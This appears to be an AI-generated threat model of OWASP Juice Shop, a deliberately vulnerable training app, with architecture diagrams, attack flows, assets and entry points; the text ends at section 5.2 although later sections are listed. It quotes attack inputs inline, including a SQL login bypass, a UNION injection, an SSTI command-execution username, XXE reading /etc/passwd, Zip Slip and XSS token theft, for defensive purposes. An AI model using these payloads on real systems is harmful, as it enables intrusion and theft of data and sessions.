# Threat Model — OWASP Juice Shop

| Field | Value |
|-------|-------|
| Generated | 2026-04-10T17:00:00Z |
| Analysis Duration | 42 min 42 s |
| Analyst | appsec-threat-analyst (Claude) |
| Model | claude-sonnet-4-6 |
| Agent Models | all agents: claude-sonnet-4-6 |
| Input Tokens | unavailable |
| Output Tokens | unavailable |
| Cache Read Tokens | unavailable |
| Cache Write Tokens | unavailable |
| Estimated Cost | unavailable |
| Context Sources | None |

> ℹ Token and cost data are not accessible at agent runtime. Check the Anthropic Console for usage details of this session.

---

## Table of Contents

- [Management Summary](#management-summary)
- [1. System Overview](#1-system-overview)
- [2. Architecture Diagrams](#2-architecture-diagrams)
  - [2.1 System Context](#21-system-context)
  - [2.2 Containers](#22-containers)
  - [2.3 Technology Architecture](#23-technology-architecture)
  - [2.4 Security Architecture Assessment](#24-security-architecture-assessment)
- [3. Security-Relevant Use Cases](#3-security-relevant-use-cases)
  - [3.1 Authentication Flow](#31-authentication-flow)
  - [3.2 SQL Injection Attack Path](#32-sql-injection-attack-path)
  - [3.3 File Upload — XXE and Zip Slip](#33-file-upload--xxe-and-zip-slip)
  - [3.4 XSS via Search Result](#34-xss-via-search-result)
  - [3.5 B2B Order RCE via eval](#35-b2b-order-rce-via-eval)
- [4. Assets](#4-assets)
- [5. Attack Surface](#5-attack-surface)
  - [5.1 Unauthenticated entry points (14)](#51-unauthenticated-entry-points-14)
  - [5.2 Authenticated entry points (14)](#52-authenticated-entry-points-14)
- [6. Trust Boundaries](#6-trust-boundaries)
- [7. Identified Security Controls](#7-identified-security-controls)
- [7b. Requirements Compliance](#7b-requirements-compliance)
- [8. Threat Register](#8-threat-register)
  - [8.1 Critical (6)](#81-critical-6)
  - [8.2 High (9)](#82-high-9)
  - [8.3 Medium (8)](#83-medium-8)
  - [8.4 Low (5)](#84-low-5)
- [9. Critical Findings](#9-critical-findings)
- [10. Mitigation Register](#10-mitigation-register)
- [11. Out of Scope](#11-out-of-scope)

---

## Management Summary

This threat model identified **28 threats** across 5 components of OWASP Juice Shop v19.2.1. The following table summarises how the risk is distributed across severity levels and which subject areas dominate each level.

| Risk Level | Count | Key Areas |
|------------|-------|-----------|
| 🔴 Critical | 6 | SQLi auth bypass, hardcoded private key, RCE via eval, XXE file read, SSTI via username |
| 🟠 High | 9 | JWT storage in localStorage, NoSQL injection, open redirect, MD5 passwords, CORS wildcard |
| 🟡 Medium | 8 | Missing rate limiting on login, CSP absent, metrics exposed, path traversal in FTP, IDOR |
| 🟢 Low | 5 | Security question reset, log disclosure, cookie secret, HSTS absent, error message leakage |

### Immediate Actions (P1) — within 48 hours, before any production deployment

| # | Mitigation | Severity | Requirement | Threats | Effort |
|---|-----------|----------|-------------|---------|--------|
| 1 | [M-001 — Remove hardcoded RSA private key](#m-001) | 🔴 Critical | [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | [T-001](#t-001) | Low |
| 2 | [M-002 — Parameterize all SQL queries](#m-002) | 🔴 Critical | [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | [T-002](#t-002), [T-003](#t-003) | Medium |
| 3 | [M-003 — Disable XXE in XML parser](#m-003) | 🔴 Critical | [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | [T-004](#t-004) | Low |
| 4 | [M-004 — Remove eval from userProfile and b2bOrder](#m-004) | 🔴 Critical | [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | [T-005](#t-005), [T-006](#t-006) | Low |

### Key Strengths

- Container runs as non-root (UID 65532) on a distroless base image — limits post-exploitation privilege escalation ([Dockerfile](vscode://file/home/mrohr/juice-shop/Dockerfile:19))
- GitHub Actions CI/CD workflows pin all action references to commit SHA — prevents supply-chain substitution ([.github/workflows/ci.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/ci.yml:26))
- CycloneDX SBOM generated during Docker build — enables supply-chain transparency ([package.json](vscode://file/home/mrohr/juice-shop/package.json:62))
- CodeQL SAST integrated in CI pipeline — provides automated code-level vulnerability scanning ([.github/workflows/codeql-analysis.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml))

### Requirements Compliance

**Baseline:** [OWASP Generic Security Baseline](https://cheatsheetseries.owasp.org) (cached — plugin fallback)
**Result:** 38 requirements checked — ✅ 9 PASS · ❌ 22 FAIL · ❌ 3 ANTI-PATTERN · ⚠️ 4 PARTIAL

**⚠ Architectural violations:**
- **[WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — Token storage in localStorage:** JWT tokens stored in browser localStorage expose every authenticated session to theft via any XSS on the page, with no server-side revocation possible.
- **[AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) — No standard IdP / SSO:** Application implements its own custom JWT auth instead of delegating to a central identity provider, losing centralized MFA enforcement and audit trails.
- **[DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) — MD5 password hashing:** Passwords stored as unsalted MD5 hashes rather than using bcrypt/argon2; any database breach results in immediate mass credential compromise.

Top violated MUST requirements:
- **[IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — SQL Injection:** Raw string interpolation in login and search queries allows full database extraction by unauthenticated attackers.
- **[DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Hardcoded secrets:** RSA private key, HMAC secret, and cookie secret embedded in source code — anyone with repo access can forge admin JWTs.
- **[IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — XXE enabled:** XML parser configured with `noent: true` allows reading arbitrary server files.

→ *Full compliance details in [Section 7b — Requirements Compliance](#7b-requirements-compliance).*

### Top Findings

- **[T-001 — Hardcoded RSA Private Key](#t-001)** — violates `[DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)` · **P1** — Any actor with repository read access can forge valid admin JWTs and authenticate as any user including admin.
- **[T-002 — SQL Injection in Login](#t-002)** — violates `[IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)` · **P1** — Unauthenticated attacker can bypass login entirely with `' OR 1=1--` and gain admin session without credentials.
- **[T-003 — SQL Injection in Product Search](#t-003)** — violates `[IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)` · **P1** — Attacker can extract complete user table including MD5-hashed passwords via UNION injection on the search endpoint.
- **[T-004 — XXE in File Upload](#t-004)** — violates `[IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)` · **P1** — XML upload with external entity reads arbitrary server files including `/etc/passwd`, returned in error response.
- **[T-005 — Server-Side eval in User Profile (SSTI)](#t-005)** — violates `[IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)` · **P1** — Authenticated user sets username to `#{process.mainModule.require('child_process').execSync('id')}` for remote code execution.
- **[T-006 — RCE via safeEval in B2B Order](#t-006)** — violates `[IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)` · **P1** — Authenticated B2B attacker bypasses `notevil` sandbox via prototype pollution to achieve Node.js code execution.

### Recommended Priority Actions

1. **P1 · [M-001 — Remove hardcoded RSA private key](#m-001)** — fulfils `[DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)` · addresses 1 threat · Effort: Low — Move private key to environment variable or secrets manager; rotate immediately.
2. **P1 · [M-002 — Parameterize all SQL queries](#m-002)** — fulfils `[IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)` · addresses 2 threats · Effort: Medium — Replace template-literal SQL with Sequelize ORM methods or parameterized queries.
3. **P1 · [M-003 — Disable XXE in XML parser](#m-003)** — fulfils `[IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)` · addresses 1 threat · Effort: Low — Set `noent: false, nonet: true` in libxmljs2 options.
4. **P1 · [M-004 — Remove eval from userProfile and b2bOrder](#m-004)** — fulfils `[IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)` · addresses 2 threats · Effort: Low — Remove eval() calls entirely; use safe string formatting for Pug templates.
5. **P2 · [M-005 — Replace MD5 with bcrypt for password hashing](#m-005)** — fulfils `[DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)` · addresses 1 threat · Effort: Medium — Migrate to bcrypt (cost factor 12) in UserModel setter.
6. **P2 · [M-006 — Move JWT tokens to HttpOnly cookies (BFF pattern)](#m-006)** — fulfils `[WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)` · addresses 2 threats · Effort: High — Remove localStorage token storage; use HttpOnly, Secure, SameSite=Strict cookie.
7. **P3 · [M-007 — Restrict CORS to known origins](#m-007)** — fulfils `[WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html)` · addresses 1 threat · Effort: Low — Replace wildcard cors() with explicit origin allowlist.
8. **P3 · [M-008 — Add global Content-Security-Policy header](#m-008)** — fulfils `[WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)` · addresses 2 threats · Effort: Medium — Implement strict CSP via helmet.contentSecurityPolicy().

### Overall Security Rating

🔴 **Critical gaps — not suitable for any production exposure** — Six Critical-severity vulnerabilities (including unauthenticated SQL injection, a publicly-known hardcoded RSA private key, and server-side code execution) make this application trivially compromisable by any unauthenticated attacker.

→ *Full details in [Threat Register](#8-threat-register) and [Mitigation Register](#10-mitigation-register).*

---

## 1. System Overview

OWASP Juice Shop (v19.2.1) is an intentionally insecure web application maintained by the Open Worldwide Application Security Project (OWASP) for security awareness training, penetration testing practice, and Capture-The-Flag (CTF) competitions. It implements a fictional online juice shop with realistic e-commerce functionality covering user registration, product browsing, basket management, checkout, user reviews, B2B ordering, and a chatbot. The application is purposely loaded with vulnerabilities spanning the OWASP Top 10 and beyond.

**Repository**: https://github.com/juice-shop/juice-shop.git
**Team**: OWASP Juice Shop Project (open-source, volunteer-maintained)
**Compliance scope**: OWASP Top 10 (deliberately violated — educational intent)
**Deployment**: Docker container (distroless/nodejs24, UID 65532) on port 3000

**Complexity tier**: Moderate — two deployable units (Express API server + Angular SPA compiled to static files), with two backing data stores (SQLite + MarsDB). The system is technically a monolith with embedded frontend, but the distinct trust boundary between the browser (Angular SPA) and the server (Express API) warrants Container-level modeling.

**Context sources**: None available. This assessment is based entirely on source code analysis.

**Overall security impression**: The application is intentionally vulnerable and should **never** be deployed in any production or internet-exposed context. Every major OWASP Top 10 category is represented by at least one confirmed, exploitable vulnerability. Unauthenticated attackers can trivially bypass authentication via SQL injection, read arbitrary server files via XXE, and execute arbitrary server-side code — all without any credentials. The hardcoded RSA private key in source code means every JWT ever issued by any instance can be forged by anyone with repository access.

---

## 2. Architecture Diagrams

The following diagrams model the system architecture at different abstraction levels using the C4 model. Components highlighted with a red border carry at least one Medium-or-higher threat from the register.

### 2.1 System Context

The Context view shows who interacts with the system, which external services it depends on, and which trust zones each actor sits in. Red boxes mark components that expose primary attack surface to untrusted actors.

```mermaid
graph TD
    classDef person   fill:#08427B,stroke:#073B6F,color:#fff
    classDef system   fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db       fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk     fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["🌐 Public Internet · untrusted"]
        Anon["Anonymous User\nbrowser"]:::risk
        Attacker["Attacker\nbrowser / curl"]:::risk
        B2BClient["B2B Client\nexternal system"]:::risk
    end

    subgraph DMZ["🔶 DMZ / Edge (no WAF, no gateway)"]
        JuiceShop["OWASP Juice Shop\nExpress 4 · Node.js 20-24\nPort 3000"]:::risk
    end

    subgraph EXTERNAL["🌐 External Services"]
        GoogleOAuth["Google OAuth 2.0\naccounts.google.com"]:::external
        GoogleUserInfo["Google UserInfo API\napis.googleapis.com"]:::external
    end

    Anon -->|"HTTP · port 3000"| JuiceShop
    Attacker -->|"HTTP · port 3000"| JuiceShop
    B2BClient -->|"POST /b2b/v2/orders · HTTP"| JuiceShop
    JuiceShop -->|"OAuth implicit token request"| GoogleOAuth
    JuiceShop -->|"GET userinfo · HTTPS"| GoogleUserInfo

    %% Trust Boundary Key:
    %% INTERNET→DMZ: No gateway, no WAF — direct TCP to port 3000
    %% JuiceShop→Google: TLS enforced by googleapis.com
```

**Key takeaway:** Every external request — including the attacker — reaches the Express monolith directly on port 3000, with no API gateway, no WAF, and no rate-limiting on the most sensitive endpoints, meaning the entire attack surface is fully exposed to the public internet.

### 2.2 Containers

The Container view zooms into the deployable units. The critical observation: the Angular SPA is served as static files from the same Express process that handles all API requests, and the JWT private key used to sign tokens lives inside that same process — so any RCE on the API gives instant token-forging capability.

```mermaid
graph TD
    classDef person   fill:#08427B,stroke:#073B6F,color:#fff
    classDef system   fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db       fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk     fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["🌐 Public Internet · untrusted"]
        Browser["User Browser\nAngular SPA (runtime)"]:::risk
    end

    subgraph CONTAINER["🔒 Docker Container · UID 65532"]
        ExpressAPI["Express API Server\nNode.js 20-24 · TypeScript\nPort 3000 · 61 routes"]:::risk
        StaticFiles["Static File Server\nAngular SPA dist\nbuilt frontend"]:::system
        FTPDir["FTP Directory\n/ftp · serve-index\nunauthenticated"]:::risk
        EncKeys["Encryption Keys\n/encryptionkeys\npublic browsing"]:::risk
        LogFiles["Log Files\n/support/logs\nunauthenticated"]:::risk
        Prometheus["Prometheus Metrics\n/metrics · unauthenticated\nprom-client 14"]:::risk
    end

    subgraph DATA["🔐 Data Tier · restricted"]
        SQLite["SQLite Database\nSequelize 6\nusers, products, orders"]:::db
        MarsDB["MarsDB (in-memory)\nreviews, orders\nNoSQL"]:::db
    end

    Browser -->|"GET /  ·  HTTPS/HTTP"| StaticFiles
    Browser -->|"REST API calls · JWT Bearer"| ExpressAPI
    ExpressAPI -->|"SQL · ORM + raw queries"| SQLite
    ExpressAPI -->|"NoSQL · find/update"| MarsDB
    ExpressAPI -->|"serve-index · HTTP"| FTPDir
    ExpressAPI -->|"serve-index · HTTP"| EncKeys
    ExpressAPI -->|"serve-index · HTTP"| LogFiles
    ExpressAPI -->|"prom-client · HTTP"| Prometheus

    %% Trust Boundary Key:
    %% Browser→Container: No TLS terminator, no mTLS; JWT in localStorage
    %% Container→SQLite: No encryption at rest; file-based, no auth
    %% Container→MarsDB: In-memory; no persistence, no auth
```

**Key takeaway:** The BFF pattern is absent — the SPA holds JWT tokens in localStorage, so any XSS anywhere on the page gives an attacker direct access to steal the session token and impersonate any user.

### 2.3 Technology Architecture

This diagram shows the runtime middleware stack from top to bottom. Nodes outlined in red carry at least one Medium-or-higher threat.

```mermaid
graph TB
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef ok   fill:#C8E6C9,stroke:#388E3C,color:#000

    subgraph CLIENT["Browser (untrusted execution environment)"]
        AngularSPA["Angular v16 SPA\nTypeScript\nJWT in localStorage"]:::risk
    end

    subgraph RUNTIME["Node.js 20-24 Runtime · Docker distroless"]
        Express["Express 4.22\nHTTP Server · port 3000"]:::risk
        Helmet["helmet 4.6\nnoSniff + frameguard only\nNo CSP, No HSTS"]:::risk
        CorsMiddleware["cors 2.8\nwildcard origin *\nno credentials control"]:::risk
        AuthMW["express-jwt 0.1.3\nRS256 public key verify\nHardcoded private key"]:::risk
        Routes["61 Route Handlers\nTypeScript modules"]:::risk
        BodyParser["body-parser 1.20\nmulter 1.4 (uploads)"]:::ok
    end

    subgraph STORAGE["Storage Layer"]
        Sequelize["Sequelize 6.37\nSQLite3 5.1\nRaw query injection"]:::risk
        MarsDBStore["MarsDB 0.6\nIn-memory NoSQL\nNoSQL injection"]:::risk
        FileSystem["Filesystem\n/ftp /encryptionkeys\n/uploads /logs"]:::risk
    end

    AngularSPA -->|"HTTP REST · Bearer JWT"| Express
    Express -->|"middleware chain"| Helmet
    Helmet -->|"next()"| CorsMiddleware
    CorsMiddleware -->|"next()"| AuthMW
    AuthMW -->|"next() if valid"| Routes
    Routes -->|"SQL queries"| Sequelize
    Routes -->|"NoSQL queries"| MarsDBStore
    Routes -->|"file I/O"| FileSystem
    BodyParser -->|"parses request"| Routes
```

**Key takeaway:** The middleware stack applies only `noSniff` and `frameguard` from Helmet — CSP, HSTS, and CORS allowlisting are all absent, meaning the browser has no policy-enforced defence against cross-site attacks at the transport or content layer.

### 2.4 Security Architecture Assessment

The assessment below evaluates structural patterns rather than individual code defects. Each pattern is rated as present, partial, or absent.

#### Architecture Patterns

| Pattern | Present | Notes |
|---------|---------|-------|
| API Gateway | ❌ Absent | Direct exposure of Express on port 3000; no gateway, no WAF |
| Backend-for-Frontend (BFF) | ❌ Absent | SPA communicates directly with API; tokens in localStorage |
| Defense-in-depth | ❌ Absent | Single layer; no network segmentation, no WAF, no rate-limiting on login |
| Separation of concerns | ⚠️ Partial | Business logic mixed with route handlers; auth logic centralized in insecurity.ts |
| Least privilege | ⚠️ Partial | Container runs non-root (UID 65532) ✓; but many routes lack authorization checks |
| Secrets management | ❌ Absent | Private key hardcoded in source; HMAC/cookie secrets hardcoded |
| Network segmentation | ❌ Absent | All ports/paths on same host; FTP, keys, logs, metrics all public |
| Secure defaults | ❌ Absent | CORS wildcard, noent:true in XML parser, no CSP, MD5 passwords |

#### Trust Model Evaluation

The application fails to enforce fail-closed behavior at almost every trust boundary. The browser is correctly treated as untrusted in theory (JWT validation exists), but in practice the private key used to sign JWTs is publicly committed to the repository — meaning the trust model collapses entirely. JWT verification against the public key is meaningless when the private key is known.

The data tier boundary between the Express process and SQLite/MarsDB is not enforced: SQL queries use raw string interpolation, and MarsDB `$where` queries evaluate JavaScript from user input. There is no ORM-level parameterization enforced. The implicit trust of user-supplied data in query construction is the root cause of the two Critical SQL injection findings.

#### Authentication & Authorization Architecture

Authentication is custom-built using `express-jwt` v0.1.3 (released ~2013) combined with `jsonwebtoken` v0.4.0. Both are severely outdated — modern versions (8.x/9.x respectively) enforce algorithm allowlists to prevent `alg:none` attacks; these old versions do not. The RSA key pair is generated once and hardcoded in source (`lib/insecurity.ts`), making the entire token signing infrastructure compromised by default.

Authorization is applied inconsistently: some routes use `security.isAuthorized()` (JWT validation only, no RBAC), some use `security.appendUserId()` (adds user ID to request but does not enforce ownership), and the critical B2B endpoint uses `security.isAuthorized()` but then passes user-controlled `orderLinesData` directly into a sandboxed `eval`. There is no centralized authorization policy — each route handler is responsible for its own access control, creating a large attack surface for missed checks.

#### Key Architectural Risks

| # | Structural Risk | Impact if exploited | Linked threats |
|---|----------------|---------------------|----------------|
| 1 | Custom JWT auth with hardcoded key | Full authentication bypass for any user | [T-001](#t-001) |
| 2 | No BFF — tokens in localStorage | Any XSS steals all active sessions | [T-007](#t-007), [T-009](#t-009) |
| 3 | Raw SQL string interpolation throughout | Complete database extraction without auth | [T-002](#t-002), [T-003](#t-003) |
| 4 | No WAF / API gateway | No first-line defense; all attacks reach application code | [T-002](#t-002)–[T-006](#t-006) |
| 5 | Unauthenticated management endpoints | Information disclosure, operational data leakage | [T-015](#t-015), [T-016](#t-016) |

#### Overall Architecture Security Rating

🔴 **Critical gaps** — The architecture lacks every foundational security pattern: no API gateway, no BFF, no secrets management, no CORS allowlisting, no CSP, and no password hashing beyond MD5. The custom JWT implementation with a hardcoded and publicly-known private key means the authentication system provides zero actual security. This rating reflects intentional design for a training application — remediation would require structural changes, not just code fixes.

---

## 3. Security-Relevant Use Cases

These sequence diagrams document security-critical flows, showing both normal operation and the primary attack vectors identified in this assessment.

### 3.1 Authentication Flow

This sequence shows the normal login flow alongside the SQL injection bypass that exists today. The `else` branch is the attack path requiring zero credentials.

```mermaid
sequenceDiagram
    participant U as User/Attacker
    participant API as Express API
    participant DB as SQLite

    U->>API: POST /rest/user/login {"email":"...","password":"..."}
    API->>DB: SELECT * FROM Users WHERE email='INPUT' AND password='MD5(INPUT)'

    alt Normal login — valid credentials
        DB-->>API: Row with user data
        API-->>U: 200 {"token":"eyJ...","bid":1}
        Note over U: JWT stored in localStorage
    else SQL injection bypass (no credentials needed)
        Note over U: email = "' OR 1=1--"
        DB-->>API: First row in Users table (admin)
        API-->>U: 200 {"token":"eyJ...admin JWT..."}
        Note over U: Full admin access, no password required
    end
```

**Key takeaway:** The login endpoint passes email and password directly into a raw SQL string ([routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34)), allowing unauthenticated attackers to authenticate as the first database user — typically the admin — with a single request.

### 3.2 SQL Injection Attack Path

This sequence shows how an attacker progresses from product search SQL injection to full database exfiltration without any authentication.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant DB as SQLite

    A->>API: GET /rest/products/search?q=test' UNION SELECT ...
    API->>DB: SELECT * FROM Products WHERE name LIKE '%test' UNION SELECT...%'

    alt Current state — vulnerable (routes/search.ts:23)
        DB-->>API: Products + injected rows (all users, hashes)
        API-->>A: 200 JSON with user emails + MD5 passwords
        Note over A: Cracks MD5 offline, logs in as admin
    else After M-002 — parameterized query
        API->>DB: SELECT * FROM Products WHERE name LIKE ? (prepared)
        DB-->>API: Only matching products (injection blocked)
        API-->>A: 200 — only legitimate product results
    end
```

**Key takeaway:** The search endpoint at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) uses template-literal string interpolation in a raw Sequelize query, making it a zero-credential path to full user table extraction including password hashes.

### 3.3 File Upload — XXE and Zip Slip

This sequence shows two separate file upload attack paths: XXE via XML upload and path traversal via ZIP upload.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant FS as File System

    A->>API: POST /file-upload (multipart, XML file with XXE payload)
    API->>FS: libxml.parseXml(data, {noent: true, nocdata: true})

    alt XXE — current state (routes/fileUpload.ts:83)
        FS-->>API: /etc/passwd contents resolved into XML body
        API-->>A: 410 Error message includes file contents
        Note over A: Reads any file readable by UID 65532
    else After M-003 — noent:false, nonet:true
        API->>FS: libxml.parseXml(data, {noent: false, nonet: true})
        API-->>A: 410 — entities rejected, no file disclosure
    end

    A->>API: POST /file-upload (ZIP with ../../../ftp/legal.md entry)
    API->>FS: entry.pipe(writeStream('uploads/complaints/' + fileName))

    alt Zip Slip — current state (routes/fileUpload.ts:45)
        FS-->>API: File written outside uploads/ directory
        API-->>A: 204 No Content (file written to ftp/)
    else After path normalization fix
        API->>FS: path.resolve check prevents traversal
        API-->>A: 400 — path traversal rejected
    end
```

**Key takeaway:** The file upload handler enables two distinct file-system attacks: XXE reads arbitrary files server-side, while Zip Slip writes attacker-controlled content outside the intended uploads directory — both requiring no authentication.

### 3.4 XSS via Search Result

This sequence shows how stored XSS in the search result component (combined with JWT in localStorage) enables session theft.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API
    participant V as Victim Browser

    A->>API: POST /api/Products (inject XSS payload in description)
    API-->>A: 200 — product stored with unescaped HTML

    V->>API: GET /rest/products/search?q=malicious
    API-->>V: 200 — product description with XSS payload

    alt Current state — bypassSecurityTrustHtml used (search-result.component.ts:132)
        Note over V: Angular renders [innerHTML] with trusted HTML
        V->>V: XSS payload executes: localStorage.getItem('token')
        V->>A: HTTP exfil — JWT token sent to attacker server
        Note over A: Attacker authenticates as victim indefinitely
    else After M-006 — tokens in HttpOnly cookie
        Note over V: localStorage has no token — nothing to steal
        V->>V: XSS executes but finds no token
        Note over A: Cookie not accessible from JavaScript
    end
```

**Key takeaway:** The combination of Angular's `bypassSecurityTrustHtml` ([frontend/src/app/search-result/search-result.component.ts:132](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:132)) and JWT tokens stored in localStorage creates a direct path from any XSS to full session hijacking.

### 3.5 B2B Order RCE via eval

This sequence shows how the B2B order endpoint uses a sandboxed eval that can be escaped by an authenticated attacker.

```mermaid
sequenceDiagram
    participant A as Attacker
    participant API as Express API

    A->>API: POST /b2b/v2/orders {"orderLinesData":"<payload>","cid":"..."}
    Note over API: Requires valid JWT (isAuthorized())
    API->>API: vm.runInContext('safeEval(orderLinesData)', sandbox)

    alt Current state — safeEval bypass possible (routes/b2bOrder.ts:23)
        API->>API: Prototype pollution escapes notevil sandbox
        API-->>A: Node.js process execution — RCE on host
        Note over A: Full server compromise with UID 65532
    else After M-004 — eval removed
        API->>API: JSON.parse(orderLinesData) — strict validation only
        API-->>A: 400 if non-JSON structure provided
    end
```

**Key takeaway:** The B2B order endpoint at [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23) runs user-supplied data through `notevil`'s sandboxed eval inside a Node.js `vm` context — a pattern that has been broken repeatedly; authenticated attackers can achieve remote code execution on the server.

---

## 4. Assets

The table below catalogues every asset that requires protection, classified by sensitivity, with cross-references to the threats that target it.

**Classification legend:** **Public** = no protection required · **Internal** = restricted to authenticated users · **Confidential** = restricted to specific roles or owners · **Restricted** = highest sensitivity, regulated or business-critical (passwords, signing keys, payment data).

| Asset | Classification | Description | Linked Threats |
|-------|---------------|-------------|----------------|
| User credentials (email + MD5 password hash) | Restricted | Authentication data for all registered users; MD5 means breach = immediate crack | [T-002](#t-002), [T-003](#t-003), [T-010](#t-010) |
| RSA JWT private key | Restricted | Signs all authentication tokens; hardcoded in source code | [T-001](#t-001) |
| JWT tokens (active sessions) | Confidential | Bearer tokens granting API access; stored in localStorage | [T-007](#t-007), [T-009](#t-009) |
| Payment card data (card numbers, CVV) | Restricted | Stored in Cards table via Sequelize | [T-003](#t-003), [T-017](#t-017) |
| User PII (name, address, email) | Confidential | Full customer profile data in Users and Addresss tables | [T-003](#t-003), [T-013](#t-013) |
| Order history | Confidential | Customer purchase records in SQLite and MarsDB | [T-003](#t-003), [T-020](#t-020) |
| Product reviews | Internal | User-submitted reviews stored in MarsDB | [T-011](#t-011), [T-012](#t-012) |
| Application source code | Internal | Served via /ftp, /encryptionkeys, Swagger UI | [T-015](#t-015), [T-016](#t-016) |
| Server files (/etc/passwd etc.) | Restricted | Readable via XXE; container filesystem | [T-004](#t-004) |
| Application logs | Internal | Access logs and audit logs under /support/logs | [T-019](#t-019) |
| Prometheus metrics | Internal | Request counts, user counts, wallet balances | [T-015](#t-015) |
| Encryption keys directory | Restricted | RSA public key and CTF keys under /encryptionkeys | [T-016](#t-016) |
| Application availability | Internal | Express process; single point of failure | [T-022](#t-022), [T-023](#t-023) |

---

## 5. Attack Surface

Every identified entry point through which an attacker can interact with the system, split by authentication requirement so the unauthenticated surface (the most exposed) is visible at a glance.

### 5.1 Unauthenticated entry points (14)

These endpoints can be reached without any credentials and form the primary attack surface from the public internet.

| Entry Point | Protocol/Method | Notes | Linked Threats |
|-------------|----------------|-------|----------------|
| POST /rest/user/login | HTTP POST | SQL injection; no rate limit | [T-002](#t-002), [T-024](#t-024) |
| GET /rest/products/search | HTTP GET | SQL injection via ?q param | [T-003](#t-003) |
| POST /file-upload | HTTP POST (multipart) | XXE + Zip Slip; no auth required | [T-004](#t-004), [T-008](#t-008) |
| POST /api/Users | HTTP POST | User registration; no CAPTCHA on API | [T-022](#t-022) |
| GET /ftp/* | HTTP GET | Directory listing + file download | [T-016](#t-016) |
| GET /encryptionkeys/* | HTTP GET | RSA public key + CTF keys browsable | [T-016](#t-016) |
| GET /support/logs/* | HTTP GET | Application log files downloadable | [T-019](#t-019) |
| GET /metrics | HTTP GET | Prometheus metrics; no auth | [T-015](#t-015) |
| GET /api-docs | HTTP GET | Swagger UI with full API schema | [T-016](#t-016) |
| GET /redirect | HTTP GET | Open redirect with bypass-able allowlist | [T-014](#t-014) |
| GET /rest/products/:id/reviews | HTTP GET | NoSQL $where injection on id param | [T-011](#t-011) |
| GET /rest/chatbot/status | HTTP GET | Chatbot availability; training data load | [T-023](#t-023) |
| POST /rest/user/reset-password | HTTP POST | Security-question-based reset; brute-forceable | [T-025](#t-025) |
| GET /rest/user/security-question | HTTP GET | Leaks security question for any email | [T-025](#t-025) |

### 5.2 Authenticated entry points (14)

These endpoints require at least a valid session JWT. They still represent attack surface for authenticated attackers and account-takeover follow-up.

| Entry Point | Protocol/Method | Required role | Notes | Linked Threats |
|-------------|----------------|---------------|-------|----------------|
| POST /b2b/v2/orders | HTTP POST | customer (JWT) | RCE via safeEval on orderLinesData | [T-006](#t-006) |
| GET /profile | HTTP GET | customer (JWT) | SSTI via eval on username field | [T-005](#t-005) |
| PUT /rest/products/:id/reviews | HTTP PUT | customer (JWT) | NoSQL operator injection on _id | [T-012](#t-012) |
| POST /profile/image/url | HTTP POST | customer (cookie) | SSRF via profileImage URL fetch | [T-018](#t-018) |
| GET /api/Users | HTTP GET | customer (JWT) | Lists all users; IDOR | [T-013](#t-013) |
| GET /api/Users/:id | HTTP GET | customer (JWT) | Any user can read any user record | [T-013](#t-013) |
| POST /rest/user/data-export | HTTP POST | customer (JWT) | Exports all personal data as JSON | [T-013](#t-013) |
